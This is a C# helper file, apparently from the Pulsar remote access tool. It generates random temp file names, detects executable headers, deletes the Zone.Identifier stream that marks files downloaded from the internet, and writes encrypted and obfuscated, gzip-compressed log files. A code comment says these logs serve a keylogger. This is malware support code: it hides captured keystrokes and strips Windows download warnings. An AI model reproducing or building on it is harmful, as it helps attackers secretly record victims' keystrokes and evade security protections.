using Pulsar.Common.Cryptography;
using System;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;

namespace Pulsar.Common.Helpers
{
    public static class FileHelper
    {
        private static readonly char[] IllegalPathChars = Path.GetInvalidPathChars().Union(Path.GetInvalidFileNameChars()).ToArray();

        public static bool HasIllegalCharacters(string path)
        {
            return path.Any(c => IllegalPathChars.Contains(c));
        }

        public static string GetRandomFilename(int length, string extension = "")
        {
            return string.Concat(StringHelper.GetRandomString(length), extension);
        }

        public static string GetTempFilePath(string extension = "")
        {
            string tempFilePath;
            do
            {
                tempFilePath = Path.Combine(Path.GetTempPath(), GetRandomFilename(12, extension));
            } while (File.Exists(tempFilePath));

            return tempFilePath;
        }

        public static bool HasExecutableIdentifier(byte[] binary)
        {
            if (binary.Length < 2) return false;
            return (binary[0] == 'M' && binary[1] == 'Z') || (binary[0] == 'Z' && binary[1] == 'M');
        }

        public static bool DeleteZoneIdentifier(string filePath)
        {
            return NativeMethods.DeleteFile(filePath + ":Zone.Identifier");
        }

        public static void WriteLogFile(string filename, string appendText, Aes256 aes)
        {
            appendText = ReadLogFile(filename, aes) + appendText;

            using (FileStream fStream = File.Open(filename, FileMode.Create, FileAccess.Write))
            {
                byte[] data = aes.Encrypt(Encoding.UTF8.GetBytes(appendText));
                fStream.Write(data, 0, data.Length);
                fStream.Flush(true);
            }
        }

        public static string ReadLogFile(string filename, Aes256 aes)
        {
            return File.Exists(filename) ? Encoding.UTF8.GetString(aes.Decrypt(File.ReadAllBytes(filename))) : string.Empty;
        }

        /// <summary>
        /// Append obfuscated (and compressed) text in temp/log files safely using framed chunks.
        /// Each write: [4-byte length][obfuscated bytes].
        /// The plain text is compressed with GZip before obfuscation to save disk space.
        /// </summary>
        public static void WriteObfuscatedLogFile(string filename, string appendText)
        {
            if (string.IsNullOrEmpty(filename)) throw new ArgumentNullException(nameof(filename));
            if (appendText == null) appendText = string.Empty;

            byte[] plainBytes = Encoding.UTF8.GetBytes(appendText);

            // Compress plaintext first to save space (backwards-compatible: readers will detect gzip)
            byte[] compressed = CompressGzip(plainBytes);

            // Obfuscate the compressed bytes
            byte[] obfBytes = ByteRotationObfuscator.Obfuscate(compressed);

            string dir = Path.GetDirectoryName(filename);
            if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
                Directory.CreateDirectory(dir);

            try
            {
                using (var fs = File.Open(filename, FileMode.Append, FileAccess.Write, FileShare.Read))
                using (var bw = new BinaryWriter(fs, Encoding.UTF8))
                {
                    bw.Write(obfBytes.Length); // 4-byte length prefix
                    bw.Write(obfBytes);        // obfuscated (compressed) chunk
                    bw.Flush();
                    fs.Flush(true);
                }
            }
            catch
            {
                // silently ignore append errors to avoid crashing keylogger
            }
        }

        /// <summary>
        /// Read obfuscated log file with support for framed chunks and automatic gzip decompression.
        /// Falls back to legacy single-block deobfuscation if framed read fails.
        /// </summary>
        public static string ReadObfuscatedLogFile(string filename)
        {
            if (string.IsNullOrEmpty(filename) || !File.Exists(filename))
                return string.Empty;

            try
            {
                byte[] allBytes = File.ReadAllBytes(filename);
                if (allBytes.Length == 0) return string.Empty;

                using (var ms = new MemoryStream(allBytes))
                using (var br = new BinaryReader(ms, Encoding.UTF8))
                {
                    var sb = new StringBuilder();
                    bool framed = true;

                    while (ms.Position < ms.Length)
                    {
                        if (ms.Length - ms.Position < 4)
                        {
                            framed = false;
                            break;
                        }

                        int len = br.ReadInt32();
                        if (len < 0 || len > ms.Length - ms.Position)
                        {
                            framed = false;
                            break;
                        }

                        byte[] chunk = br.ReadBytes(len);
                        if (chunk == null || chunk.Length == 0)
                            continue;

                        // Deobfuscate chunk first
                        byte[] deob = ByteRotationObfuscator.Deobfuscate(chunk);

                        // Try to detect gzip via magic bytes and decompress to raw bytes
                        try
                        {
                            if (deob.Length >= 2 && deob[0] == 0x1F && deob[1] == 0x8B)
                            {
                                byte[] decompressedBytes = DecompressGzipToBytes(deob);
                                sb.Append(Encoding.UTF8.GetString(decompressedBytes));
                            }
                            else
                            {
                                // Not compressed — interpret directly as UTF8
                                sb.Append(Encoding.UTF8.GetString(deob));
                            }
                        }
                        catch
                        {
                            // On any failure, try to at least interpret deob as UTF8 to avoid losing text
                            try { sb.Append(Encoding.UTF8.GetString(deob)); } catch { /* ignore */ }
                        }
                    }

                    if (framed) return sb.ToString();
                }
            }
            catch
            {
                // ignore and fallback
            }

            // fallback to legacy single-block deobfuscation (file previously written without framing or compression)
            try
            {
                byte[] obfAll = File.ReadAllBytes(filename);
                byte[] deobAll = ByteRotationObfuscator.Deobfuscate(obfAll);

                // If deobAll appears to be gzip compressed, decompress
                if (deobAll.Length >= 2 && deobAll[0] == 0x1F && deobAll[1] == 0x8B)
                {
                    byte[] decompressed = DecompressGzipToBytes(deobAll);
                    return Encoding.UTF8.GetString(decompressed);
                }

                return Encoding.UTF8.GetString(deobAll);
            }
            catch
            {
                return string.Empty;
            }
        }

        private static byte[] DecompressGzipToBytes(byte[] compressed)
        {
            using (var input = new MemoryStream(compressed))
            using (var gzip = new System.IO.Compression.GZipStream(input, System.IO.Compression.CompressionMode.Decompress))
            using (var output = new MemoryStream())
            {
                gzip.CopyTo(output);
                return output.ToArray();
            }
        }


        private static byte[] CompressGzip(byte[] data)
        {
            try
            {
                using (var output = new MemoryStream())
                {
                    using (var gzip = new GZipStream(output, CompressionLevel.Optimal, leaveOpen: true))
                    {
                        gzip.Write(data, 0, data.Length);
                    }
                    // Reset position to read full compressed array
                    output.Position = 0;
                    return output.ToArray();
                }
            }
            catch
            {
                // if compression fails, return original data to avoid data loss
                return data;
            }
        }
    }
}
